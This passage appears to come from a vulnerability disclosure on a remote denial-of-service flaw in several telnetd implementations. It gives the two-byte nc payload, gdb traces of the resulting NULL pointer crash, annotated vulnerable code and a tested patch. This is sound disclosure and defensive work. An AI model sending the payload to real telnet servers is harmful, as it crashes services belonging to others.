freebsd-13-1p1# cd /usr/src/libexec/telnetd &amp;&amp; make obj &amp;&amp; make depend &amp;&amp; make &amp;&amp; make install
...
install -o root -g wheel -m 555 telnetd /usr/libexec/telnetd
install -o root -g wheel -m 444 telnetd.debug /usr/lib/debug/usr/libexec/telnetd.debug
install -o root -g wheel -m 444 telnetd.8.gz  /usr/share/man/man8/
</code></pre>
<p>The <code>telnetd</code> program will be compiled without optimization and with debug information (<code>-g</code>).</p>
<p>Sending the payload from a Kali Linux:</p>
<pre><code>kali% (sleep 10 ; printf "\xff\xf7") | nc -n -v 192.168.1.200 23
(UNKNOWN) [192.168.1.200] 23 (telnet) open
&lt;FF&gt;&lt;FD&gt;%
</code></pre>
<p>And debugging with gdb on FreeBSD:</p>
<pre><code>freebsd-13-1p1# ps -auxww | grep telnetd
root  4430   0.0  0.1 19016 7400  -  Ss   08:58     0:00.01 telnetd
root  4432   0.0  0.0 12840 2316  0  R+   08:58     0:00.00 grep telnetd
freebsd-13-1p1# gdb -p 4430
GNU gdb (GDB) 12.1 [GDB v12.1 for FreeBSD]
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-portbld-freebsd13.0".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 4430
Reading symbols from /usr/libexec/telnetd...
Reading symbols from /usr/lib/debug//usr/libexec/telnetd.debug...

warning: Could not load shared library symbols for [vdso].
Do you need "set solib-search-path" or "set sysroot"?
Reading symbols from /lib/libutil.so.9...
(No debugging symbols found in /lib/libutil.so.9)
Reading symbols from /lib/libncursesw.so.9...
(No debugging symbols found in /lib/libncursesw.so.9)
Reading symbols from /usr/lib/libmp.so.7...
(No debugging symbols found in /usr/lib/libmp.so.7)
Reading symbols from /lib/libcrypto.so.111...
(No debugging symbols found in /lib/libcrypto.so.111)
Reading symbols from /usr/lib/libpam.so.6...
(No debugging symbols found in /usr/lib/libpam.so.6)
Reading symbols from /usr/lib/libkrb5.so.11...
(No debugging symbols found in /usr/lib/libkrb5.so.11)
Reading symbols from /usr/lib/libroken.so.11...
(No debugging symbols found in /usr/lib/libroken.so.11)
Reading symbols from /lib/libc.so.7...
(No debugging symbols found in /lib/libc.so.7)
Reading symbols from /lib/libthr.so.3...
(No debugging symbols found in /lib/libthr.so.3)
Reading symbols from /usr/lib/libasn1.so.11...
(No debugging symbols found in /usr/lib/libasn1.so.11)
Reading symbols from /usr/lib/libcom_err.so.5...
(No debugging symbols found in /usr/lib/libcom_err.so.5)
Reading symbols from /lib/libcrypt.so.5...
(No debugging symbols found in /lib/libcrypt.so.5)
Reading symbols from /usr/lib/libhx509.so.11...
(No debugging symbols found in /usr/lib/libhx509.so.11)
Reading symbols from /usr/lib/libwind.so.11...
(No debugging symbols found in /usr/lib/libwind.so.11)
Reading symbols from /usr/lib/libheimbase.so.11...
(No debugging symbols found in /usr/lib/libheimbase.so.11)
Reading symbols from /usr/lib/libprivateheimipcc.so.11...
(No debugging symbols found in /usr/lib/libprivateheimipcc.so.11)
Reading symbols from /libexec/ld-elf.so.1...
(No debugging symbols found in /libexec/ld-elf.so.1)
[Switching to LWP 100331 of process 4430]
0x00000008015e76b8 in _read () from /lib/libc.so.7
(gdb) b telrcv
Breakpoint 1 at 0x102be98: file /usr/src/contrib/telnet/telnetd/state.c, line 96.
(gdb) c
Continuing.

Breakpoint 1, telrcv () at /usr/src/contrib/telnet/telnetd/state.c:96
96      while (ncc &gt; 0) {
(gdb) n
97          if ((&amp;ptyobuf[BUFSIZ] - pfrontp) &lt; 2)
(gdb) 
99          c = *netip++ &amp; 0377, ncc--;
(gdb) 
101         if (decrypt_input)
(gdb) 
104         switch (state) {
(gdb) 
115             if (c == IAC) {     // [1] IAC = 255 = 0xff. this is the first character we sent
(gdb) 
116                 state = TS_IAC; // [2] the state variable becomes TS_IAC
(gdb) 
117                 break;
(gdb) 
96      while (ncc &gt; 0) {
(gdb)

Breakpoint 1, telrcv () at /usr/src/contrib/telnet/telnetd/state.c:96
96      while (ncc &gt; 0) {
(gdb) 
97          if ((&amp;ptyobuf[BUFSIZ] - pfrontp) &lt; 2)
(gdb) 
99          c = *netip++ &amp; 0377, ncc--;
(gdb) 
101         if (decrypt_input)
(gdb) 
104         switch (state) {
(gdb) 
159 gotiac:         switch (c) {
          /* we reach line 159, thanks to the line 158 shown in the next C listing:
             the state variable is checked against TS_IAC (defined in the previous loop) */
(gdb) 
220                 DIAG(TD_OPTIONS,

(gdb) 
222                 ptyflush(); /* half-hearted */
(gdb) 
223                 init_termbuf();
(gdb) 
224                 if (c == EC)
(gdb) 
225                     ch = *slctab[SLC_EC].sptr;
(gdb)

Program received signal SIGSEGV, Segmentation fault.
Address not mapped to object.
0x000000000102c2af in telrcv () at /usr/src/contrib/telnet/telnetd/state.c:225
225                     ch = *slctab[SLC_EC].sptr;
(gdb) bt
#0  0x000000000102c2af in telrcv () at /usr/src/contrib/telnet/telnetd/state.c:225
#1  0x0000000001033383 in ttloop () at /usr/src/contrib/telnet/telnetd/utility.c:84
#2  0x0000000001030ff7 in getterminaltype (name=0x1045000 &lt;user_name&gt; "") at /usr/src/contrib/telnet/telnetd/telnetd.c:481
#3  0x0000000001030dff in doit (who=0x7fffffffe928) at /usr/src/contrib/telnet/telnetd/telnetd.c:715
#4  0x0000000001030b46 in main (argc=0, argv=0x7fffffffea30) at /usr/src/contrib/telnet/telnetd/telnetd.c:408
(gdb) p ch
$1 = 0 '\000'
(gdb) p slctab[10]
$2 = {defset = {flag = 0 '\000', val = 0 '\000'}, current = {flag = 0 '\000', val = 0 '\000'}, sptr = 0x0}
(gdb) p slctab[10].sptr 
$3 = (cc_t *) 0x0
(gdb) p *(slctab[10].sptr)
Cannot access memory at address 0x0
</code></pre>
<p>We can see 2 loops in gdb, each for one character.</p>
<p>And the crash is a null pointer dereference.</p>
<p><code>SLC_EC</code> is defined in  <code>usr/src/contrib/telnet/arpa/telnet.h</code>:</p>
<pre><code>193 #define SLC_SUSP        9
194 #define SLC_EC          10
195 #define SLC_EL          11
</code></pre>
<p>When reading the <code>/usr/src/contrib/telnet/telnetd/state.c</code> file, we can find the vulnerable lines 225 and 227:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">91</span> <span style="color: #0000FF">telrcv</span>(<span style="color: #B00040">void</span>)
 <span style="color: #666666">92</span> {
 <span style="color: #666666">93</span>         <span style="color: #B00040">int</span> c;
 <span style="color: #666666">94</span>         <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
 <span style="color: #666666">95</span> 
 <span style="color: #666666">96</span>         <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
 <span style="color: #666666">97</span>                 <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>)
 <span style="color: #666666">98</span>                         <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">99</span>                 c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>, ncc<span style="color: #666666">--</span>;
<span style="color: #666666">100</span> <span style="border: 1px solid #FF0000">#</span>ifdef  ENCRYPTION
<span style="color: #666666">101</span>                 <span style="color: #008000; font-weight: bold">if</span> (decrypt_input)
<span style="color: #666666">102</span>                         c <span style="color: #666666">=</span> (<span style="color: #666666">*</span>decrypt_input)(c);
<span style="color: #666666">103</span> <span style="border: 1px solid #FF0000">#</span>endif  <span style="color: #408080; font-style: italic">/* ENCRYPTION */</span>
<span style="color: #666666">104</span>                 <span style="color: #008000; font-weight: bold">switch</span> (state) {
...
<span style="color: #666666">158</span>                 <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_IAC</span>:  <span style="color: #408080; font-style: italic">// in the second loop, state is TS_IAC,</span>
                                  <span style="color: #408080; font-style: italic">// from [2], we continue the execution flow there</span>
<span style="color: #666666">159</span> <span style="color: #A0A000">gotiac</span>:                 <span style="color: #008000; font-weight: bold">switch</span> (c) { <span style="color: #408080; font-style: italic">// testing the current character</span>
...
<span style="color: #666666">211</span>                         <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">212                          * Erase Character and</span>
<span style="color: #408080; font-style: italic">213                          * Erase Line</span>
<span style="color: #408080; font-style: italic">214                          */</span>
<span style="color: #666666">215</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>: <span style="color: #408080; font-style: italic">// is the current character 247 (0xf7)?</span>
<span style="color: #666666">216</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>: <span style="color: #408080; font-style: italic">// is the current character 248 (0xf8)?</span>
<span style="color: #666666">217</span>                             {
<span style="color: #666666">218</span>                                 cc_t ch;
<span style="color: #666666">219</span> 
<span style="color: #666666">220</span>                                 DIAG(TD_OPTIONS,
<span style="color: #666666">221</span>                                         printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
<span style="color: #666666">222</span>                                 ptyflush();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
<span style="color: #666666">223</span>                                 init_termbuf();
<span style="color: #666666">224</span>                                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
<span style="color: #666666">225</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">226</span>                                 <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">227</span>                                         ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">228</span>                                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
<span style="color: #666666">229</span>                                         <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
<span style="color: #666666">230</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">231</span>                             }
</pre></div>

<p>In the code, <code>EC</code> corresponds to <code>247</code> (<code>\xf7</code>) and <code>EL</code> corresponds to <code>248</code> (<code>\xf8</code>):</p>
<p>They are defined in <code>/usr/src/contrib/telnet/arpa/telnet.h</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">39</span> <span style="border: 1px solid #FF0000">#</span>define IAC     <span style="color: #666666">255</span>             <span style="color: #408080; font-style: italic">/* interpret as command: */</span>
...
<span style="color: #666666">46</span> <span style="border: 1px solid #FF0000">#</span>define EL      <span style="color: #666666">248</span>             <span style="color: #408080; font-style: italic">/* erase the current line */</span>
<span style="color: #666666">47</span> <span style="border: 1px solid #FF0000">#</span>define EC      <span style="color: #666666">247</span>             <span style="color: #408080; font-style: italic">/* erase the current character */</span>
</pre></div>

<p>So we have this code executed when sending the payload <code>\xff\xf8</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr;
</pre></div>

<p>or this code executed when sending the payload <code>\xff\xf7</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr;
</pre></div>

<p>Using gdb, we can see that <code>slctab[10].sptr</code> (<code>slctab[SLC_EC].sptr</code>) and <code>slctab[11].sptr</code> (<code>slctab[SLC_EL].sptr</code>) are set to <code>NULL</code> (<code>0x0</code>) so the value at the <code>NULL</code> address is unreachable.</p>
<p>We can modify the function by checking the pointers. This change will remove the previous security vulnerabilities:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">211</span>                         <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">212                          * Erase Character and</span>
<span style="color: #408080; font-style: italic">213                          * Erase Line</span>
<span style="color: #408080; font-style: italic">214                          */</span>
<span style="color: #666666">215</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
<span style="color: #666666">216</span>                         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
<span style="color: #666666">217</span>                             {
<span style="color: #666666">218</span>                                 cc_t ch <span style="color: #666666">=</span> (cc_t)_POSIX_VDISABLE;
<span style="color: #666666">219</span>
<span style="color: #666666">220</span>                                 <span style="color: #0000FF">DIAG</span>(TD_OPTIONS,
<span style="color: #666666">221</span>                                         printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
<span style="color: #666666">222</span>                                 <span style="color: #0000FF">ptyflush</span>();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
<span style="color: #666666">223</span>                                 <span style="color: #0000FF">init_termbuf</span>();
<span style="color: #666666">224</span>                                 <span style="color: #0000FF">if</span> (c <span style="color: #666666">==</span> EC)
<span style="color: #666666">225</span>                                 {
<span style="color: #666666">226</span>                                         <span style="color: #008000; font-weight: bold">if</span> (slctab[SLC_EC].sptr)
<span style="color: #666666">227</span>                                                 ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr;
<span style="color: #666666">228</span>                                 }
<span style="color: #666666">229</span>                                 <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">230</span>                                 {
<span style="color: #666666">231</span>                                         <span style="color: #008000; font-weight: bold">if</span> (slctab[SLC_EL].sptr)
<span style="color: #666666">232</span>                                                 ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr;
<span style="color: #666666">233</span>                                 }
<span style="color: #666666">234</span>                                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
<span style="color: #666666">235</span>                                         <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
<span style="color: #666666">236</span>                                 <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">237</span>                             }
</pre></div>

<p>The resulting patch is:</p>
<pre><code>freebsd-13-1p1# diff -u -p ./usr/src/contrib/telnet/telnetd/state.c /usr/src/contrib/telnet/telnetd/state.c
--- ./usr/src/contrib/telnet/telnetd/state.c    2022-05-12 05:53:58.000000000 +0100
+++ /usr/src/contrib/telnet/telnetd/state.c 2022-08-21 09:41:09.699357000 +0100
@@ -215,16 +215,22 @@ gotiac:           switch (c) {
            case EC:
            case EL:
                {
-               cc_t ch;
+               cc_t ch = (cc_t)_POSIX_VDISABLE;

                DIAG(TD_OPTIONS,
                    printoption("td: recv IAC", c));
                ptyflush(); /* half-hearted */
                init_termbuf();
                if (c == EC)
-                   ch = *slctab[SLC_EC].sptr;
+               {
+                   if (slctab[SLC_EC].sptr)
+                       ch = *slctab[SLC_EC].sptr;
+               }
                else
-                   ch = *slctab[SLC_EL].sptr;
+               {
+                   if (slctab[SLC_EL].sptr)
+                       ch = *slctab[SLC_EL].sptr;
+               }
                if (ch != (cc_t)(_POSIX_VDISABLE))
                    *pfrontp++ = (unsigned char)ch;
                break;
freebsd-13-1p1#
</code></pre>
<p>We tested the patch and it works.</p>
<p><a id="remote-dos-bonus-points"></a></p>
<h3>Bonus points</h3>
<p>Telnet supports secure mode. This mode is also vulnerable in FreeBSD as shown below:</p>
<p><code>/usr/src/crypto/heimdal/appl/telnet/telnetd/state.c</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">79</span> <span style="color: #B00040">void</span>
 <span style="color: #666666">80</span> <span style="color: #0000FF">telrcv</span>(<span style="color: #B00040">void</span>)
 <span style="color: #666666">81</span> {
 <span style="color: #666666">82</span>     <span style="color: #B00040">int</span> c;
 <span style="color: #666666">83</span>     <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
 <span style="color: #666666">84</span>
 <span style="color: #666666">85</span>     <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {  
 <span style="color: #666666">86</span>         <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>)
 <span style="color: #666666">87</span>             <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">88</span>         c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>, ncc<span style="color: #666666">--</span>;
 <span style="color: #666666">89</span> <span style="border: 1px solid #FF0000">#</span>ifdef ENCRYPTION
 <span style="color: #666666">90</span>         <span style="color: #008000; font-weight: bold">if</span> (decrypt_input)
 <span style="color: #666666">91</span>             c <span style="color: #666666">=</span> (<span style="color: #666666">*</span>decrypt_input)(c);
 <span style="color: #666666">92</span> <span style="border: 1px solid #FF0000">#</span>endif
 <span style="color: #666666">93</span>         <span style="color: #008000; font-weight: bold">switch</span> (state) {
...
<span style="color: #666666">189</span>         <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">190          * Erase Character and</span>
<span style="color: #408080; font-style: italic">191          * Erase Line</span>
<span style="color: #408080; font-style: italic">192          */</span>
<span style="color: #666666">193</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
<span style="color: #666666">194</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
<span style="color: #666666">195</span>             {
<span style="color: #666666">196</span>                 cc_t ch;
<span style="color: #666666">197</span> 
<span style="color: #666666">198</span>                 DIAG(TD_OPTIONS,
<span style="color: #666666">199</span>                      printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
<span style="color: #666666">200</span>                 ptyflush();     <span style="color: #408080; font-style: italic">/* half-hearted */</span>
<span style="color: #666666">201</span>                 init_termbuf();
<span style="color: #666666">202</span>                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
<span style="color: #666666">203</span>                     ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">204</span>                 <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">205</span>                     ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr; <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">206</span>                 <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
<span style="color: #666666">207</span>                     <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
<span style="color: #666666">208</span>                 <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">209</span>             }
</pre></div>

<p><a id="remote-dos-netkit-telnet-0.17"></a></p>
<h3>netkit-telnet-0.17</h3>
<p>The same behavior can be observed with netkit-telnet-0.17 under Linux, while sending the same payloads (<code>\xff\xf7</code> or <code>\xff\xf8</code>):</p>
<pre><code>gentoo% (sleep 10 ; printf "\xff\xf7") | nc -n -v localhost 23
</code></pre>
<p>And debugging with gdb on Gentoo:</p>
<pre><code>gentoo% gdb -p `pidof in.telnetd`
GNU gdb (Gentoo 11.2 vanilla) 11.2
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-pc-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;https://bugs.gentoo.org/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 20328
Reading symbols from /usr/sbin/telnetd...
Reading symbols from /lib64/libncurses.so.6...
(No debugging symbols found in /lib64/libncurses.so.6)
Reading symbols from /lib64/libc.so.6...
Reading symbols from /lib64/libtinfo.so.6...
(No debugging symbols found in /lib64/libtinfo.so.6)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
0x00007f1973c68a9e in __GI___libc_read (fd=0, buf=0x55640e1a6ec0 &lt;netibuf&gt;, nbytes=8192) at ../sysdeps/unix/sysv/linux/read.c:26
26  ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x000055640e198d37 in telrcv () at /tmp/telnet/netkit-telnet-0.17/telnetd/state.c:211
211              if (c == EC) ch = *slctab[SLC_EC].sptr;
(gdb) bt
#0  0x000055640e198d37 in telrcv () at /tmp/telnet/netkit-telnet-0.17/telnetd/state.c:211
#1  0x000055640e19d553 in ttloop () at /tmp/telnet/netkit-telnet-0.17/telnetd/utility.c:92
#2  0x000055640e19bf53 in getterminaltype (name=0x7fffa7941730 "") at /tmp/telnet/netkit-telnet-0.17/telnetd/telnetd.c:484
#3  0x000055640e19c66f in doit (who=0x7fffa7941880, who_len=16) at /tmp/telnet/netkit-telnet-0.17/telnetd/telnetd.c:722
#4  0x000055640e19bdb7 in main (argc=0, argv=0x7fffa7941a40, env=0x7fffa7941a48) at /tmp/telnet/netkit-telnet-0.17/telnetd/telnetd.c:402
(gdb) list
206 {
207   cc_t ch;
208   DIAG(TD_OPTIONS, printoption("td: recv IAC", c));
209   ptyflush();  /* half-hearted */
210   init_termbuf();
211   if (c == EC) ch = *slctab[SLC_EC].sptr;
212   else ch = *slctab[SLC_EL].sptr;
213   if (ch != (cc_t)(_POSIX_VDISABLE))
214       *pfrontp++ = (unsigned char)ch;
215   break;
(gdb) p slctab[10].sptr
$1 = (cc_t *) 0x0
</code></pre>
<p>We can recognize the same vulnerable function in <code>netkit-telnet-0.17/telnetd/state.c</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">81</span>   <span style="color: #B00040">void</span> <span style="color: #0000FF">telrcv</span>(<span style="color: #B00040">void</span>) {
 <span style="color: #666666">82</span>     <span style="color: #008000; font-weight: bold">register</span> <span style="color: #B00040">int</span> c;
 <span style="color: #666666">83</span>     <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
 <span style="color: #666666">84</span> 
 <span style="color: #666666">85</span>     <span style="color: #008000; font-weight: bold">while</span> (ncc <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) {
 <span style="color: #666666">86</span>     <span style="color: #008000; font-weight: bold">if</span> ((<span style="color: #666666">&amp;</span>ptyobuf[BUFSIZ] <span style="color: #666666">-</span> pfrontp) <span style="color: #666666">&lt;</span> <span style="color: #666666">2</span>) <span style="color: #008000; font-weight: bold">break</span>;
 <span style="color: #666666">87</span>     c <span style="color: #666666">=</span> <span style="color: #666666">*</span>netip<span style="color: #666666">++</span> <span style="color: #666666">&amp;</span> <span style="color: #666666">0377</span>;
 <span style="color: #666666">88</span>     ncc<span style="color: #666666">--</span>;
...
<span style="color: #666666">200</span>           <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">201               * Erase Character and</span>
<span style="color: #408080; font-style: italic">202               * Erase Line</span>
<span style="color: #408080; font-style: italic">203               */</span>
<span style="color: #666666">204</span>           <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
<span style="color: #666666">205</span>           <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
<span style="color: #666666">206</span>          {
<span style="color: #666666">207</span>              cc_t ch;
<span style="color: #666666">208</span>              DIAG(TD_OPTIONS, printoption(<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
<span style="color: #666666">209</span>              ptyflush();    <span style="color: #408080; font-style: italic">/* half-hearted */</span>
<span style="color: #666666">210</span>              init_termbuf();
<span style="color: #666666">211</span>              <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC) ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr;   <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">212</span>              <span style="color: #008000; font-weight: bold">else</span> ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr;           <span style="color: #408080; font-style: italic">// vuln</span>
<span style="color: #666666">213</span>              <span style="color: #008000; font-weight: bold">if</span> (ch <span style="color: #666666">!=</span> (cc_t)(_POSIX_VDISABLE))
<span style="color: #666666">214</span>              <span style="color: #666666">*</span>pfrontp<span style="color: #666666">++</span> <span style="color: #666666">=</span> (<span style="color: #B00040">unsigned</span> <span style="color: #B00040">char</span>)ch;
<span style="color: #666666">215</span>              <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">216</span>          }
<span style="color: #666666">217</span>           
</pre></div>

<p><a id="remote-dos-inetutils"></a></p>
<h3>Inetutils</h3>
<p>Inetutils can be found here:
<a href="https://git.savannah.gnu.org/cgit/inetutils.git/snapshot/inetutils-2.3.tar.gz">https://git.savannah.gnu.org/cgit/inetutils.git/snapshot/inetutils-2.3.tar.gz</a>.</p>
<p>Again, we can recognize the similar vulnerable code in <code>inetutils-2.3/telnetd/state.c</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">190</span> <span style="color: #B00040">void</span>
<span style="color: #666666">191</span> <span style="color: #0000FF">telrcv</span> (<span style="color: #B00040">void</span>)
<span style="color: #666666">192</span> {
<span style="color: #666666">193</span>   <span style="color: #008000; font-weight: bold">register</span> <span style="color: #B00040">int</span> c;
<span style="color: #666666">194</span>   <span style="color: #008000; font-weight: bold">static</span> <span style="color: #B00040">int</span> state <span style="color: #666666">=</span> TS_DATA;
<span style="color: #666666">195</span> 
<span style="color: #666666">196</span>   <span style="color: #008000; font-weight: bold">while</span> ((net_input_level () <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>) <span style="color: #666666">&amp;</span> <span style="color: #666666">!</span>pty_buffer_is_full ())
<span style="color: #666666">197</span>     {
<span style="color: #666666">198</span>       c <span style="color: #666666">=</span> net_get_char (<span style="color: #666666">0</span>);
...
<span style="color: #666666">203</span>       <span style="color: #008000; font-weight: bold">switch</span> (state)
<span style="color: #666666">204</span>         {
...
<span style="color: #666666">213</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_DATA</span>:
<span style="color: #666666">214</span>           <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> IAC)
<span style="color: #666666">215</span>             {
<span style="color: #666666">216</span>               state <span style="color: #666666">=</span> TS_IAC;
<span style="color: #666666">217</span>               <span style="color: #008000; font-weight: bold">break</span>;
<span style="color: #666666">218</span>             }
...
<span style="color: #666666">260</span>         <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">TS_IAC</span>:
<span style="color: #666666">261</span>         <span style="color: #A0A000">gotiac</span>:
<span style="color: #666666">262</span>           <span style="color: #008000; font-weight: bold">switch</span> (c)
<span style="color: #666666">263</span>             {
...
<span style="color: #666666">308</span>               <span style="color: #408080; font-style: italic">/*</span>
<span style="color: #408080; font-style: italic">309                * Erase Character and</span>
<span style="color: #408080; font-style: italic">310                * Erase Line</span>
<span style="color: #408080; font-style: italic">311                */</span>
<span style="color: #666666">312</span>             <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EC</span>:
<span style="color: #666666">313</span>             <span style="color: #008000; font-weight: bold">case</span> <span style="color: #A0A000">EL</span>:
<span style="color: #666666">314</span>               {
<span style="color: #666666">315</span>                 cc_t ch;
<span style="color: #666666">316</span> 
<span style="color: #666666">317</span>                 DEBUG (debug_options, <span style="color: #666666">1</span>, printoption (<span style="color: #BA2121">&quot;td: recv IAC&quot;</span>, c));
<span style="color: #666666">318</span>                 ptyflush ();    <span style="color: #408080; font-style: italic">/* half-hearted */</span>
<span style="color: #666666">319</span>                 init_termbuf ();
<span style="color: #666666">320</span>                 <span style="color: #008000; font-weight: bold">if</span> (c <span style="color: #666666">==</span> EC)
<span style="color: #666666">321</span>                   ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EC].sptr;
<span style="color: #666666">322</span>                 <span style="color: #008000; font-weight: bold">else</span>
<span style="color: #666666">323</span>                   ch <span style="color: #666666">=</span> <span style="color: #666666">*</span>slctab[SLC_EL].sptr;
